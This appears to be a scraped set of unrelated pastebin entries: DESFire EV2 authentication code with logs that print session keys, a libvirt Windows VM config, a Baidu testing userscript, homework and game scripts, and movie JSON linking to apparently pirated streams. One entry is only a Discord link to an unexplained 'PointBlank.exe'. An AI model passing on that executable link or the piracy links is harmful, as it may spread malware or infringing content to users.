  38,
  105,
  121,
  216,
  113,
  159,
  192,
  1,
  8,
  224,
  241,
  52 ]
'session_key_enc_string: ', 'a55a0001008012cb67f1fde7b8456825b13b6b18266979d8719fc00108e0f134'
'session_key_mac_string: ', '5aa50001008012cb67f1fde7b8456825b13b6b18266979d8719fc00108e0f134'

'KSessionAuthENC: ', '0a7f2e5a01f35ec8378de5d5a40ca71a'
'KSessionAuthMAC: ', '6743b9af880a8ddc150053eb4b342366'
---------------------------------------------------------------------
Get Card Version
Getting MAC Input
'CMD Counter: ', 0
'Transaction ID: ', '80db5387'
'Command Counter: ', [ 0 ]
'transactionId: ', [ 128, 219, 83, 135 ]
'Mac Input: ', '600080DB5387'
'Encrypted zero: ', '7fcbd3fa506ac6599c419d1e586402b5'
ff 97 a7 f4 a0 d5 8c b3 38 83 3a 3c b0 c8 05 6a
'Subkey 1: ', 'FF97A7F4A0D58CB338833A3CB0C8056A'
'Subkey 2: ', 'FF2F4FE941AB19667106747961900A53'
'Mac Full: ', 'c61be8e5b0215b7275b622664440664c'
'Truncated MAC: ', '1be52172b666404c'
'MAC Truncated: ', '1be52172b666404c'
input bytes: 601BE52172B666404C
Integrity Error
'Get Card Version: ', { status: 30, data: '' }"
pjhpwV2j,Functions that relates to mac,Amrin12,JavaScript,Thursday 16th of May 2024 03:38:34 AM CDT,"/**
     * 
     * @param {number[]} cmd 
     * @param {number[]} options 
     * @returns {number[]}
     */
getMacInput = (cmd, options) => {
    console.log(""Getting MAC Input"");

    console.log(""CMD Counter: "", this.CmdCounter);
    console.log(""Transaction ID: "", this.TransactionIdentifier);

    // get cmdCounter
    const commandCounter = DesfireUtils.intToHexArray(this.CmdCounter, 1);

    console.log(""Command Counter: "", commandCounter);
    const transactionId = DesfireUtils.hexStringToByte(this.TransactionIdentifier);
    console.log(""transactionId: "", transactionId);

    let macInput = cmd.concat(commandCounter).concat(transactionId);

    if (options != null) 
        macInput = macInput.concat(options);

    return macInput;
}
   
getCardVersion = async () => {
    let cmd = DESFIRE_INS.GET_UID;

    const macInput = this.getMacInput(cmd, null);
    const macInputString = DesfireUtils.getHexFromDecArray(macInput);
    console.log(""Mac Input: "", macInputString);

    const macFull = CMAC.calculateCmac(this.sessionAuthMac, macInputString);
    console.log(""Mac Full: "", macFull);

    const macTruncated = CMAC.macTruncate(macFull);
    console.log(""MAC Truncated: "", macTruncated);

    const param = DesfireUtils.hexStringToByte(macTruncated);
    cmd = cmd.concat(param);

    let response = await this.sendCommand(cmd);
    console.log(""Get Card Version: "", response)

}

CMAC::macTruncate = (message) => {
    const fullMAC = this.hexStringToByte(message);
    const fullMACLength = fullMAC.length;

    const truncatedMAC = new Uint8Array(fullMACLength / 2);
    let truncatedMACPos = 0;
    for (let i = 1; i < fullMACLength; i += 2) {
        truncatedMAC[truncatedMACPos] = fullMAC[i];
        truncatedMACPos++;
    }

    const truncatedMACString = Array.from(truncatedMAC).map(byte => {
        // Convert each byte to its hexadecimal representation
        return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
    }).join('');

    console.log('Truncated MAC: ', truncatedMACString);
    return truncatedMACString;
}"
uTc5pgrd,authenticateEV2First,Amrin12,JavaScript,Thursday 16th of May 2024 03:33:13 AM CDT,"/**
     * 
     * @param {Number} keyNo 
     * @param {String} key 
     * @returns 
     */
    authenticateEV2First = async (keyNo, key) => {
        let cmd = DESFIRE_INS.AUTH_EV2_FIRST;
        let _keyNo = DesfireUtils.intToHexArray(keyNo, 1);
        let auth_key = key;
        let _lenCap = [0x02];
        let _pcdCap = [0xC0, 0x00];

        cmd = cmd.concat(_keyNo).concat(_lenCap).concat(_pcdCap);
        let response = await this.sendCommand(cmd);
        
        let randB_enc = response.data;
        console.log(""Auth EV2 First RandB Enc: "", randB_enc);

        let randB = DesfireUtils.aesDecryptor(randB_enc, auth_key);
        console.log(""Auth EV2 First RandB: "", randB);

        let randB_rotate = await DesfireUtils.rotateLeft(randB);
        console.log(""Auth EV2 First RandB Rotate: "", randB_rotate);

        // Generate random 16-byte RndA
        const randA = CryptoJS.lib.WordArray.random(16).toString(CryptoJS.enc.Hex);
        console.log(""Auth EV2 First RandA: "", randA);

        let randAB = randA.concat(randB_rotate);

        let iv = CryptoJS.enc.Hex.parse(randB_enc);
        let randAB_enc = DesfireUtils.aesEncryptor(randAB, auth_key, iv);

        dataToSend = randAB_enc;

        let instructionByte = ""AF"";
        let cmdString = instructionByte.concat(dataToSend).toUpperCase();

        let byteArray = cmdString.match(/.{1,2}/g).map(hex => parseInt(hex, 16));
        cmd = byteArray;

        response = await this.sendCommand(cmd);
        console.log(""First part response: "", response);

        const status = response.status;

        if (status != DESFIRE_STATUS.SUCCESS) {
            console.log(status);
            console.log(""RandB' is wrong!\n"");
            return false;
        }

        let data_enc = response.data;
        
        iv = CryptoJS.enc.Hex.parse(dataToSend.slice(-32));

        // decrypt response
        // response contains TI (4 bytes) + randA' (16 bytes) + PDcap related (12 bytes)
        let data = DesfireUtils.aesDecryptor(data_enc, auth_key, iv);
        console.log(""Data received: "", data);

        let ti = data.slice(0, 8);
        let newRandA = data.slice(8, 40);
        let pcdcap_returned = data.slice(40);

        console.log(""TI: "", ti);
        console.log(""RandA: "", newRandA);
        console.log(""PCDcap: "", pcdcap_returned);

        // rotate right
        let newRandA_rotate = DesfireUtils.rotateRight(newRandA);

        if (newRandA_rotate.toUpperCase() !== randA.toUpperCase()) {
            console.log(""RandA' is not identical to original RandA. Authentication failed!\n"");
            return false;
        }

        console.log(""Auth successful!"");

        // generate AuthSessionKeys
        const session_label_enc = [0xA5, 0x5A];
        const session_label_mac = [0x5A, 0xA5];
        const session_counter = [0x00, 0x01];
        const session_length = [0x00, 0x80];
        const session_context = new Uint8Array(26);

        // xor some values in randA and randB
        // create SessionKey
        const randABytes = DesfireUtils.hexStringToByteArray(randA);
        const randBBytes = DesfireUtils.hexStringToByteArray(randB);

        console.log(""RandA Bytes: "", randABytes);
        console.log(""RandB Bytes: "", randBBytes);

        const randA_15_14 = randABytes.slice(0, 2);
        const randA_13_8 = randABytes.slice(2, 8);
        const randB_15_10 = randBBytes.slice(0, 6);
        const randB_9_0 = randBBytes.slice(6, 16);
        const randA_7_0 = randABytes.slice(8, 16);

        console.log(""RandA_15_14:"", randA_15_14);
        console.log(""RandA_13_8:"", randA_13_8);
        console.log(""RandB_15_10:"", randB_15_10);
        console.log(""RandB_9_0:"", randB_9_0);
        console.log(""RandA_7_0:"", randA_7_0);

        const randA_13_8_string = DesfireUtils.getHexFromDecArray(Array.from(randA_13_8));
        const randB_15_10_string = DesfireUtils.getHexFromDecArray(Array.from(randB_15_10));
        const xoredValues = DesfireUtils.xorHexStrings(randA_13_8_string, randB_15_10_string);
        
        const xored_bytes = DesfireUtils.hexStringToByte(xoredValues);

        console.log(""XORed Value: "", xoredValues);
        console.log(""XORed Bytes: "", xored_bytes);
 
        session_context.set(randA_15_14, 0);
        session_context.set(xored_bytes, 2);
        session_context.set(randB_9_0, 8);
        session_context.set(randA_7_0, 18);

        const session_context_array = Array.from(session_context);

        const sv1 = session_label_enc.concat(session_counter).concat(session_length).concat(session_context_array);
        const sv2 = session_label_mac.concat(session_counter).concat(session_length).concat(session_context_array);

        const session_key_enc_string = Array.from(sv1).map(byte => {
            // Convert each byte to its hexadecimal representation
            return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
        }).join('');

        const session_key_mac_string = Array.from(sv2).map(byte => {
            // Convert each byte to its hexadecimal representation
            return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
        }).join('');

        console.log(""SV1: "", sv1);
        console.log(""SV2: "", sv2);

        console.log(""session_key_enc_string: "", session_key_enc_string)
        console.log(""session_key_mac_string: "", session_key_mac_string)

        const sessionAuthMac = CMAC.calculateCmac(key, session_key_mac_string);
        const sessionAuthEnc = CMAC.calculateCmac(key, session_key_enc_string);

        this.sessionAuthMac = sessionAuthMac;
        this.sessionAuthEnc = sessionAuthEnc;
        this.CmdCounter = 0;
        this.TransactionIdentifier = ti;
        this.authenticateEV2FirstSucess = true;

        console.log(""\n"");
        return true;
    }"
LSikxy5M,windows11-ryzen5800x-libvirt-xml-14,mmcze,XML,Thursday 16th of May 2024 03:10:10 AM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>25165824</memory>
  <currentMemory unit='KiB'>25165824</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-7.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
  </os>
  <features>
    <acpi/>
    <apic eoi='on'/>
    <hap state='on'/>
    <hyperv mode='custom'>
      <relaxed state='on'/>
      <vapic state='on'/>
      <spinlocks state='on' retries='8191'/>
      <vpindex state='on'/>
      <runtime state='on'/>
      <synic state='on'/>
      <stimer state='on'>
        <direct state='on'/>
      </stimer>
      <reset state='on'/>
      <vendor_id state='on' value='1234567890ab'/>
      <frequencies state='on'/>
      <reenlightenment state='on'/>
      <tlbflush state='on'/>
      <ipi state='on'/>
      <avic state='on'/>
    </hyperv>
    <kvm>
      <hidden state='on'/>
      <hint-dedicated state='on'/>
      <poll-control state='on'/>
      <pv-ipi state='on'/>
    </kvm>
    <pmu state='off'/>
    <vmport state='off'/>
    <smm state='on'>
      <tseg unit='MiB'>64</tseg>
    </smm>
    <ioapic driver='kvm'/>
  </features>
  <cpu mode='host-passthrough' check='full' migratable='off'>
    <topology sockets='1' dies='1' cores='7' threads='2'/>
    <cache mode='passthrough'/>
    <feature policy='disable' name='x2apic'/>
    <feature policy='require' name='tsc-deadline'/>
    <feature policy='require' name='tsc_adjust'/>
    <feature policy='require' name='arch-capabilities'/>
    <feature policy='require' name='rdctl-no'/>
    <feature policy='require' name='skip-l1dfl-vmentry'/>
    <feature policy='require' name='mds-no'/>
    <feature policy='require' name='pschange-mc-no'/>
    <feature policy='require' name='topoext'/>
    <feature policy='disable' name='svm'/>
    <feature policy='require' name='hypervisor'/>
    <feature policy='require' name='invtsc'/>
    <feature policy='require' name='ibpb'/>
    <feature policy='require' name='virt-ssbd'/>
    <feature policy='require' name='pdpe1gb'/>
    <feature policy='require' name='cmp_legacy'/>
    <feature policy='require' name='xsaves'/>
    <feature policy='require' name='perfctr_core'/>
    <feature policy='require' name='clzero'/>
    <feature policy='require' name='xsaveerptr'/>
  </cpu>
  <clock offset='timezone' timezone='Europe/Prague'>
    <timer name='rtc' present='no' tickpolicy='catchup'/>
    <timer name='pit' tickpolicy='discard'/>
    <timer name='hpet' present='no'/>
    <timer name='kvmclock' present='no'/>
    <timer name='hypervclock' present='yes'/>
    <timer name='tsc' present='yes' mode='native'/>
  </clock>
  <on_poweroff>destroy</on_poweroff>
  <on_reboot>destroy</on_reboot>
  <on_crash>destroy</on_crash>
  <pm>
    <suspend-to-mem enabled='no'/>
    <suspend-to-disk enabled='no'/>
  </pm>
  <devices>
    <emulator>/usr/bin/qemu-system-x86_64</emulator>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/crypt/win2-storage/disk.raw'/>
      <backingStore/>
      <target dev='vda' bus='scsi'/>
      <boot order='1'/>
      <address type='drive' controller='0' bus='0' target='0' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/zrcadlo2/win2-storage2/disk.raw'/>
      <backingStore/>
      <target dev='vdb' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='1' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool1/win2-storage3/disk.raw'/>
      <backingStore/>
      <target dev='vdc' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='2' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <disk type='file' device='disk'>
      <driver name='qemu' type='raw' cache='none' io='io_uring' discard='unmap'/>
      <source file='/ssdpool2/win2-storage4/disk.raw'/>
      <backingStore/>
      <target dev='vdd' bus='scsi'/>
      <address type='drive' controller='0' bus='0' target='3' unit='0'/>
      <blockio discard_granularity='33554432'/>
    </disk>
    <controller type='pci' index='0' model='pcie-root'/>
    <controller type='pci' index='1' model='dmi-to-pci-bridge'>
      <model name='i82801b11-bridge'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='2' model='pci-bridge'>
      <model name='pci-bridge'/>
      <target chassisNr='2'/>
      <address type='pci' domain='0x0000' bus='0x01' slot='0x00' function='0x0'/>
    </controller>
    <controller type='pci' index='3' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='3' port='0x10'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='4' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='4' port='0x11'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x1'/>
    </controller>
    <controller type='pci' index='5' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='5' port='0x12'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x2'/>
    </controller>
    <controller type='pci' index='6' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='6' port='0x13'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x02' function='0x3'/>
    </controller>
    <controller type='pci' index='7' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='7' port='0x8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x0' multifunction='on'/>
    </controller>
    <controller type='pci' index='8' model='pcie-root-port'>
      <model name='pcie-root-port'/>
      <target chassis='8' port='0x9'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x01' function='0x1'/>
    </controller>
    <controller type='scsi' index='0' model='virtio-scsi'>
      <driver queues='8' iothread='1'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1e' function='0x2'/>
    </controller>
    <controller type='sata' index='0'>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x1f' function='0x2'/>
    </controller>
    <controller type='usb' index='0' model='nec-xhci' ports='6'>
      <address type='pci' domain='0x0000' bus='0x04' slot='0x00' function='0x0'/>
    </controller>
    <interface type='bridge'>
      <mac address='52:54:00:46:db:27'/>
      <source bridge='br0'/>
      <model type='virtio'/>
      <driver queues='8'/>
      <address type='pci' domain='0x0000' bus='0x00' slot='0x03' function='0x0'/>
    </interface>
    <input type='mouse' bus='ps2'/>
    <input type='keyboard' bus='ps2'/>
    <tpm model='tpm-tis'>
      <backend type='emulator' version='2.0'/>
    </tpm>
    <audio id='1' type='none'/>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x0'/>
      </source>
      <rom file='/usr/share/ovmf/rx7900xt.rom'/>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x0' multifunction='on'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x1'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x1'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x2'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x2'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x29' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x03' slot='0x00' function='0x3'/>
    </hostdev>
    <hostdev mode='subsystem' type='usb' managed='yes'>
      <source>
        <vendor id='0x0458'/>
        <product id='0x6007'/>
        <address bus='3' device='2'/>
      </source>
      <address type='usb' bus='0' port='3'/>
    </hostdev>
    <hostdev mode='subsystem' type='pci' managed='yes'>
      <driver name='vfio'/>
      <source>
        <address domain='0x0000' bus='0x2b' slot='0x00' function='0x3'/>
      </source>
      <address type='pci' domain='0x0000' bus='0x06' slot='0x00' function='0x0'/>
    </hostdev>
    <watchdog model='itco' action='reset'/>
    <memballoon model='none'/>
  </devices>
  <seclabel type='dynamic' model='dac' relabel='yes'/>
<qemu:commandline>
<qemu:arg value=""-fw_cfg""/>
<qemu:arg value=""opt/ovmf/X-PciMmio64Mb,string=65536""/>
</qemu:commandline>
</domain>"
2JuJPzr5,邀您一起看：⚙ 阅动漫🔮设置 ⚙,xiaomianao666,JavaScript,Thursday 16th of May 2024 03:08:21 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⚙ 阅动漫🔮设置 ⚙@@
VUr8VHCt,切换搜索词和sid,stevenos,JavaScript,Thursday 16th of May 2024 03:00:45 AM CDT,"(() => {
    'use strict';

    const ONLINE_HOST_WISE = 'm.baidu.com';
    const ONLINE_HOST_PC = 'www.baidu.com';
    let ONLINE_HOST = ONLINE_HOST_WISE;
    // 获取query
    const href = location.href;
    const urlObj = new URL(href);
    let search = urlObj.search;
    if (search.startsWith('?')) {
        search = search.substring(1);
    }
    if (urlObj.host.startsWith('www.')) {
        ONLINE_HOST = ONLINE_HOST_PC;
    }
    const queries = search.split('&').map(i => i.split('='));
    // 获取sid和搜索词
    const sid = (queries.find(i => i[0] === 'sid') || [])[1];
    const word = (queries.find(i => i[0] === 'word') || [])[1];
    // 存储sid和搜索词
    let storedSids = localStorage.getItem('sids') || '';
    storedSids = json(storedSids) || [];
    if (sid && !storedSids.includes(sid)) {
        storedSids.push(sid);
    }
    storedSids.sort((a, b) => a - b); // 排个序方便找
    let storedWords = localStorage.getItem('words') || '';
    storedWords = json(storedWords) || [];
    if (word && !storedWords.includes(word)) {
        storedWords.push(word);
    }
    localStorage.setItem('words', JSON.stringify(storedWords));
    localStorage.setItem('sids', JSON.stringify(storedSids));

    function json(strings) {
        try {
            return JSON.parse(strings);
        } catch (e) {
            return '';
        }
    }

    function getRamdom() {
        return Math.random().toString(16).substring(2, 8);
    }

    function changeSearchQuery(key, val) {
        const newSearch = queries
            .map(i => {
                if (i[0] === key) {
                    return [key, val].join('=');
                } else {
                    return i.join('=');
                }
            })
            .join('&');
        location.href = [urlObj.origin, urlObj.pathname, `?${newSearch}`].join('');
    }

    function changeHost(newHost = ONLINE_HOST) {
        location.href = [urlObj.protocol, '//', newHost, urlObj.pathname, `?${search}`].join('');
    }

    function clearStorage() {
        localStorage.removeItem('sids');
        localStorage.removeItem('words');
    }

    function exportStorage() {
        const sids = localStorage.getItem('sids');
        const words = localStorage.getItem('words');
        const res = {
            sids: json(sids),
            words: json(words),
        };
        console.log(""'"" + JSON.stringify(res) + ""'"");
        return res;
    }

    function importStorage(res) {
        res = json(res);
        const {sids = [], words = []} = res;
        localStorage.setItem('sids', JSON.stringify(sids));
        localStorage.setItem('words', JSON.stringify(words));
        location.reload();
    }

    function injectMenu() {
        const random = getRamdom();
        console.log(
            `injectMenu-${random} 更新文档：https://ku.baidu-int.com/d/GwPNLacR3Tt0vO`,
            '\n导出的函数：',
            '\nchangeSearchQuery, \nchangeHost, \nclearStorage, \nexportStorage, \nimportStorage'
        );
        window['changeSearchQuery'] = changeSearchQuery;
        window['changeHost'] = changeHost;
        window['clearStorage'] = clearStorage;
        window['exportStorage'] = exportStorage;
        window['importStorage'] = importStorage;

        const html = `
<div id=""menu-${random}"">
    <div>
        <span>sid:</span>
        <select id=""sid-select-${random}"">
            <option value=""0"">无sid</option>
    ${storedSids
        .map(i => `<option value=""${i}"" ${i === sid ? 'selected' : ''}>${i}</option>`)
        .join('')}
        </select>
    </div>
    <div>
        <span>Q:</span>
        <select id=""word-select-${random}"">
    ${storedWords
        .map(
            i =>
                `<option value=""${i}"" ${i === word ? 'selected' : ''}>${decodeURIComponent(
                    i
                )}</option>`
        )
        .join('')}
        </select>
    </div>
    <div>
        <span>Env:</span>
        ${
            urlObj.host === ONLINE_HOST
                ? '<span class=""info"" style=""color: red;"">线上</span>'
                : '<span class=""info"" style=""color: green;"">线下</span><button onclick=""changeHost()"">切换线上</button>'
        }
    </div>
</div>
        `;
        const menuRoot = document.createElement('div');
        menuRoot.innerHTML = html;
        document.body.appendChild(menuRoot);

        const style = `
#menu-${random} {
    position: fixed;
    width: 100%;
    box-sizing: border-box;
    top: 0;
    left: 0;
    line-height: 20px;
    display: flex;
    background: rgba(255, 255, 255, .2);
    box-shadow: 0 2px 4px rgba(255, 255, 255, .5);
    backdrop-filter: blur(2px);
    padding: 0 4px;
    z-index: 999;
}
#menu-${random} .info {
    border: 1px solid #ccc;
    border-radius: 4px;
    padding: 0 4px;
}

#menu-${random} button {
    background: #ccc;
    border-radius: 4px;
    padding: 0 4px;
    margin: 0 4px;
    box-shadow: 0 2px 4px #ccc;
}

#menu-${random} select {
    max-width: 120px;
}

        `;
        const styleRoot = document.createElement('style');
        styleRoot.innerHTML = style;
        document.body.appendChild(styleRoot);

        const js = `
const select = document.querySelector('#sid-select-${random}');
select.addEventListener('change', e => {
    let sid = e.target.value;
    if (sid === '0') {
        sid = '';
    }
    changeSearchQuery('sid', sid);
});

const wordSelect = document.querySelector('#word-select-${random}');
wordSelect.addEventListener('change', e => {
    let word = e.target.value;
    if (word) {
        changeSearchQuery('word', word);
    }
});
        `;
        const scriptRoot = document.createElement('script');
        scriptRoot.innerHTML = js;
        document.body.appendChild(scriptRoot);
    }

    injectMenu();
})();"
cuvNU1bZ,ДЗ Сдвиг значений массива,TeT91,C#,Thursday 16th of May 2024 02:13:01 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int[] numbers = { 1, 2, 3, 4, 5 };

            Console.WriteLine(""Числа в массиве:"");

            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.WriteLine(""\nНа сколько сдвинуть массив?"");

            int shift = Convert.ToInt32(Console.ReadLine());

            for (int i = 0; i < shift; i++)
            {
                int tempNumber = numbers[0];

                for (int j = 0; j < numbers.Length - 1; j++)
                {
                        numbers[j] = numbers[j + 1];
                }

                numbers[numbers.Length - 1] = tempNumber;
            }

            Console.WriteLine(""Сдвинутый массив"");
            for (int i = 0; i < numbers.Length; i++)
            {
                Console.Write(numbers[i] + "" "");
            }

            Console.ReadKey();
        }
    }
}"
0Emcbf0N,Untitled,lokcwivb,C++,Thursday 16th of May 2024 02:08:54 AM CDT,https://cdn.discordapp.com/attachments/1188075040219090964/1240561555515375668/PointBlank.exe?ex=6647027b&is=6645b0fb&hm=12b305b498352e10ac0a3facb3a2e9353f6747623c7feff2e7cb44dce2c7e6c2&
3s6NCfap,LocalScript (My Amounts),Sungmingamerpro13,CSS,Thursday 16th of May 2024 01:17:20 AM CDT,"local player = game.Players.LocalPlayer
local RoundsAmount = workspace.RoundsLeaderboard:WaitForChild(""RoundsMiddle2"").SurfaceGui.RoundsAmount
local WinsAmount = workspace.WinsLeaderboard:WaitForChild(""WinsMiddle2"").SurfaceGui.WinsAmount

while wait() do
	RoundsAmount.Text = ""My Rounds: ""..player.leaderstats.Rounds.Value
	WinsAmount.Text = ""My Wins: ""..player.leaderstats.Wins.Value
end"
kNWAkXnN,Home Image Carousel (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:47:09 AM CDT,"[
        ""https://asset.kompas.com/crops/QUxc9rR2N1ebr5kKwkoiKv77iMg=/0x117:1080x837/750x500/data/photo/2023/05/25/646ef206b4687.jpg"",
        ""https://thumbor.prod.vidiocdn.com/69tlgL9O9Nmw1ah1izt2PsdpH_8=/640x360/filters:quality(75)/vidio-web-prod-video/uploads/video/image/8138415/episode-02-84c91c.jpg"",
        ""https://i.ytimg.com/vi/yAN5uspO_hk/maxresdefault.jpg"",
        ""https://foto.kontan.co.id/IpZIH1FvvUChHZYYpT5VkS16Mqk=/smart/2024/04/29/339158367p.jpg"",
        ""https://images.gmanews.tv/webpics/2024/01/4_-_composite_2024_01_20_10_15_40.jpg""
]"
vJSBtR5e,邀您一起看：主页设置-导入,xiaomianao666,JavaScript,Thursday 16th of May 2024 12:16:17 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-导入@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjO2dldDtVVEYtODt7VXNlci1BZ2VudEBNb3ppbGxhLzUuMCAoTGludXjvvJvvvJsgQW5kcm9pZCAxMe+8m++8myBNaSAxMCBQcm8pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTUyIE1vYmlsZSBTYWZhcmkvNTM3LjM2fVwiLFwiY29sX3R5cGVcIjpcImljb25fc21hbGxfNFwiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG4oYmFzaWMpID0+IHtcXG4gICAgcHV0TXlWYXIoXFxcImNLZXlcXFwiLCBcXFwiaW1wb3J0XFxcIik7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJpbXBvcnRcXFwiKTtcXG59XFxuKSh7XFxcInZlcnNpb25cXFwiOlxcXCJ2Mi4xLjBcXFwiLFxcXCJmaWxlUGF0aFxcXCI6XFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvanMvTmV3UGxhbkNvbmZpZ0ZpbGUuanNcXFwiLFxcXCJuZXdQbGFuSnNVcmxcXFwiOlxcXCJoaWtlcjovL2Fzc2V0cy9ob21lLmpzXFxcIixcXFwiaHRtbFVybFxcXCI6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uZXhhbXBsZS5oaWtlcnZpZS9maWxlcy9Eb2N1bWVudHMvbmV3UGxhbkhvbWUuaHRtbFxcXCJ9KVwiLFwiZ3JvdXBcIjpcIuKRoOaOqOiNkFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCJ9IiwidGl0bGUiOiLkuLvpobXorr7nva4t5a+85YWlIn0=
KT46XC0K,New (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:12:13 AM CDT,"{
  ""news"": [
    {
      ""imgUrl"": ""https://s4.lk21static.xyz/wp-content/uploads/2024/04/film-kung-fu-panda-4-2024-lk21-d21.jpg"",
      ""videoId"": ""_inKs4eeHiI"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filemoon.sx/download/v02sxuswgcid"",
      ""title"": ""KUNG FU PANDA 4 (2024)"",
      ""inform"": ""10+"",
      ""hashtag"": ""2024 | Action | Adventure | Animation"",
      ""synopsis"": ""Kung Fu Panda 4 (2024) Setelah Po disadap untuk menjadi Pemimpin Spiritual Lembah Damai, dia perlu menemukan dan melatih Prajurit Naga baru, sementara penyihir jahat berencana untuk memanggil kembali semua penjahat utama yang telah dikalahkan Po ke alam roh."",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
